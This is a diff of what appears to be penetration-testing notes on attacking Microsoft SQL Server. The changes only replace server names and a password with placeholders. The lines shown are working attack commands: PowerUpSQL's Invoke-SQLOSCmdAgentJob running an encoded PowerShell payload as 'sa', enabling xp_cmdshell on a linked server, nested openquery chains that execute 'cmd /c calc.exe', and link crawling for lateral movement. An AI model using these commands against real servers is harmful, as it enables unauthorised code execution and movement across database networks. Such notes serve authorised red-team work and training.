@@ -389,12 +389,12 @@ EXEC dbo.sp_start_job N'PSJob'
 
 Using PowerUpSQL
 • Execute commands:
-Invoke-SQLOSCmdAgentJob –Subsystem PowerShell -Username sa -Password Password1 -Instance ops-sqlsrvone –Command "powershell –e <base64encodedscript>" -Verbose 
+Invoke-SQLOSCmdAgentJob –Subsystem PowerShell -Username sa -Password pass -Instance <instance-name> –Command "powershell –e <base64encodedscript>" -Verbose 
 –Subsystem CmdExec
 –Subsystem VBScript
 –Subsystem Jscript
 • List all jobs:
-Get-SQLAgentJob -Instance ops -username sa -Password pass -Verbose
+Get-SQLAgentJob -Instance <instance-name> -username sa -Password pass -Verbose
 
 ----------------------------------------------------------------------------------------------
 
@@ -442,7 +442,7 @@ EXEC sp_serveroption 'HACKMEPAL', 'DATA ACCESS', TRUE --- required sysadmin to G
 select * from openquery("HACKMEPAL",'select * from master..sysservers')
 
 Openquery queries can be chained to access links within links (nested links)
-select * from openquery("ops-mssql",'select * from openquery("ops-file",''select * from master..sysservers'')')
+select * from openquery("mssql",'select * from openquery("file",''select * from master..sysservers'')')
 
 -----------
 
@@ -450,7 +450,7 @@ On the target server, either xp_cmdshell should be already enabled; or If rpcout
 EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT “HACKMEPAL”
 
 
-select * from openquery("ops-mssql",'select * from openquery("ops-file",''select * from openquery("dpssqlsrvtwo",''''select @@version as version;exec master..xp_cmdshell "cmd /c calc.exe"'''')'')')
+select * from openquery("mssql",'select * from openquery("file",''select * from openquery("dpssqlsrvtwo",''''select @@version as version;exec master..xp_cmdshell "cmd /c calc.exe"'''')'')')
 
 Get-SQLServerLinkCrawl -Instance HACKMEPAL -Query "exec master..xp_cmdshell 'cmd /c calc.exe'"-Verbose
 
